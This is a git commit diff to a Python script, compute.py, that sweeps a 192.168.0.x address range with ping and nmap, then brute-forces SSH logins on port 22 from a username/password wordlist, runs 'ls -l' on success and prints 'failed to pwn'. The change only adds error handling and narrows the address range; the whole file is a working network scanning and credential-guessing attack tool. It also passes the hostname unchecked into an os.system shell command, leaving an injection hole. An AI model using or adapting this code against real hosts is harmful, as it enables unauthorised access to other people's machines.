ff92052424f0a71ef0647971c7954dd5ea99c904
Timothy Liu <tlkh.xms@gmail.com>
2018-03-06 22:39:24 +0800

    changes to scripts

--- compute.py
+++ compute.py
@@ -1,49 +1,52 @@
 def compute(hostname):
-    valid = "alive"
-    import os
-    if (os.system("ping -c 1 -w 1 " + hostname)) == 0:
-        from libnmap.process import NmapProcess
-        from libnmap.parser import NmapParser
-        nmproc = NmapProcess(hostname, "-sV")
-        rc = nmproc.run()
-        parsed = NmapParser.parse(nmproc.stdout)
-        host = parsed.hosts[0]
-        services = []
-        status = "Unknown"
-        cracked = False
-        for serv in host.services:
-            services.append(str(serv.port) + "/" + str(serv.service))
-            if serv.port == 22:
-                import paramiko
-                client = paramiko.client.SSHClient()
-                client.load_system_host_keys()
-                client.set_missing_host_key_policy(paramiko.WarningPolicy)
-                uid_list=[]
-                pwd_list=[]
-                f=open('wordlists/wordlist_1.txt','r')
-                for row in f:
-                    split = row.split(" ")
-                    uid_list.append(split[0])
-                    pwd_list.append(split[1])
-                for i, uid in enumerate(uid_list):
-                    pwd = pwd_list[i]
-                    try:
-                        if cracked == False:
-                            client.connect(hostname,username=uid,password=pwd)
-                            stdin, stdout, stderr = client.exec_command('ls -l')
-                            status = "Poor SSH Credentials"
-                            print("Successfully connected to host", hostname)
-                            cracked = True
-                            credentials = [uid, pwd]
-                        else: break
-                    except:
-                        status = "Unknown"
-                print("failed to pwn")                
-                client.close() 
-    else:
-        valid = "dead"
-    print(hostname,valid)
-    return (hostname, valid)
+    try:
+        valid = "alive"
+        import os
+        if (os.system("ping -c 1 -w 1 " + hostname)) == 0:
+            from libnmap.process import NmapProcess
+            from libnmap.parser import NmapParser
+            nmproc = NmapProcess(hostname, "-sV")
+            rc = nmproc.run()
+            parsed = NmapParser.parse(nmproc.stdout)
+            host = parsed.hosts[0]
+            services = []
+            status = "Unknown"
+            cracked = False
+            for serv in host.services:
+                services.append(str(serv.port) + "/" + str(serv.service))
+                if serv.port == 22:
+                    import paramiko
+                    client = paramiko.client.SSHClient()
+                    client.load_system_host_keys()
+                    client.set_missing_host_key_policy(paramiko.WarningPolicy)
+                    uid_list=[]
+                    pwd_list=[]
+                    f=open('wordlists/wordlist_1.txt','r')
+                    for row in f:
+                        split = row.split(" ")
+                        uid_list.append(split[0])
+                        pwd_list.append(split[1])
+                    for i, uid in enumerate(uid_list):
+                        pwd = pwd_list[i]
+                        try:
+                            if cracked == False:
+                                client.connect(hostname,username=uid,password=pwd)
+                                stdin, stdout, stderr = client.exec_command('ls -l')
+                                status = "Poor SSH Credentials"
+                                print("Successfully connected to host", hostname)
+                                cracked = True
+                                credentials = [uid, pwd]
+                            else: break
+                        except:
+                            status = "Unknown"
+                    print("failed to pwn")                
+                    client.close() 
+        else:
+            valid = "dead"
+        print(hostname,valid)
+    except:
+        valid = "error"
+    return hostname, valid
 
 if __name__ == '__main__':
     import dispy
@@ -61,7 +64,7 @@ if __name__ == '__main__':
     jobs = []
     test_range = []
     for i in range(0, 1):
-        for j in range(0, 255):
+        for j in range(100, 255):
             test_range.append("192.168." + str(i) + "." + str(j))
     print("Testing " + str(len(test_range)) + " hostnames")
 
